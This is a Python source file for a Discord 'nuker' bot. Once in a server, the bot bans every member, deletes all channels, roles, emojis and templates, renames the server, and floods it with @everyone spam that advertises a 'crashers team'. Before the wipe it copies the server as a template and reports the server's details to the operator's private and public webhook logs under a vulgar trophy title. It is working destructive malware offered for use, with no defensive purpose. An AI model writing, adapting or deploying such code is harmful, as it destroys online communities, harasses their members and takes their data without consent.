import aiohttp
import discord
from discord.ext import commands
from discord import Webhook
from asyncio import create_task
from cfg import bot_data
from logs import write_log

intents = discord.Intents.all()
intents.message_content = True
client = commands.Bot(command_prefix=None, help_command=None, intents=intents, reconnect=False)

async def send_log(guild) -> bool:
    embed = discord.Embed(title="Выебан сервер", color=0xdd2e44)
    embed.add_field(name="Имя сервера: ", value=guild.name)
    embed.add_field(name="Количество человек: ", value=len(guild.members))
    embed.add_field(name="Дата создания сервера: ", value=guild.created_at)

    async with aiohttp.ClientSession() as Session:
        if len(guild.members) >= 10:
            try:
                webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
                await webhook.send(embed=embed, username=bot_data['logs-username'],
                                   avatar_url=bot_data['logs-avatar'])

                try:
                    webhook = Webhook.from_url(bot_data['public-logs'], session=Session)
                    await webhook.send(embed=embed, username=bot_data['logs-username'],
                                       avatar_url=bot_data['logs-avatar'])

                    return True
                except Exception as error:
                    await write_log(f"ERROR: {error}")

                    return False

            except Exception as error:
                await write_log(f"ERROR: {error}")

                return False
        else:
            try:
                webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
                await webhook.send(embed=embed, username=bot_data['logs-username'],
                                   avatar_url=bot_data['logs-avatar'])

                return True
            except Exception as error:
                await write_log(f"ERROR: {error}")

                return False


async def send_log_message(message: str) -> bool:
    async with aiohttp.ClientSession() as Session:
        try:
            webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
            await webhook.send(content=message, username=bot_data['logs-username'],
                               avatar_url=bot_data['logs-avatar'])
            return True
        except Exception as error:
            await write_log(f"ERROR: {error}")
            return False


async def spam_channels(webhook, amount: int) -> None:
    for _ in range(amount):
        await webhook.send("@everyone @here " + bot_data['message'] + "\nBEST CRASHERS TEAM - "
                                                                      "https://discord.gg/uDnrb2cZu",
                           username=bot_data['message'],
                           avatar_url=bot_data['avatar-url'])


class Nuke:
    def __init__(self, guild) -> None:
        self.guild = guild

    async def delete_all_channels(self) -> None:
        for channel in self.guild.channels:
            try:
                await channel.delete()
            except Exception as error:
                await write_log(f"ERROR: Can't delete channel {channel.name} {error}")

    async def delete_all_roles(self) -> None:
        for role in self.guild.roles:
            try:
                await role.delete()
            except Exception as error:
                await write_log(f"ERROR: Can't delete role {role.name} {error}")

    async def ban_all_members(self) -> None:
        for member in self.guild.members:
            try:
                await member.ban(delete_message_days=7)
            except Exception as error:
                await write_log(f"ERROR: Can't ban member {member.name} {error}")

    async def create_roles(self, name: str) -> None:
        for _ in range(100):
            try:
                await self.guild.create_role(name=name)
            except Exception as error:
                await write_log(f"ERROR: Can't create role {error}")

    async def create_text_channels(self, name: str) -> None:
        for _ in range(50):
            try:
                channel = await self.guild.create_text_channel(name=name)
                try:
                    webhook = await channel.create_webhook(name=name)
                    create_task(spam_channels(webhook, 40))
                except Exception as error:
                    await write_log(f"ERROR: Can't create webhook {error}")
            except Exception as error:
                await write_log(f"ERROR: Can't create channel {error}")

    async def clear_emoji(self) -> None:
        for emoji in list(self.guild.emojis):
            try:
                await emoji.delete()
            except Exception as error:
                await write_log(f"ERROR: Can't delete emoji {error}")

    async def clear_templates(self) -> None:
        for template in await self.guild.templates():
            try:
                await template.delete()
            except Exception as error:
                await write_log(f"ERROR: Can't delete template {error}")


async def nuke_guild(guild) -> None:
    if guild.id in bot_data['white-list-guilds']:
        pass
    else:
        nuked = Nuke(guild)

        await send_log(guild)

        template = await guild.create_template(name=bot_data['message'])
        if not await send_log_message(template.url):
            await write_log(f"ERROR: Can't create template")

        with open('icon.jpg', 'rb') as file:
            icon = file.read()
        await guild.edit(name=bot_data['message'], icon=icon, community=False)

        create_task(nuked.ban_all_members())

        create_task(nuked.clear_emoji())

        create_task(nuked.clear_templates())

        create_task(nuked.delete_all_channels())

        create_task(nuked.delete_all_roles())

        create_task(nuked.create_roles(bot_data['message']))

        create_task(nuked.create_text_channels(bot_data['message']))
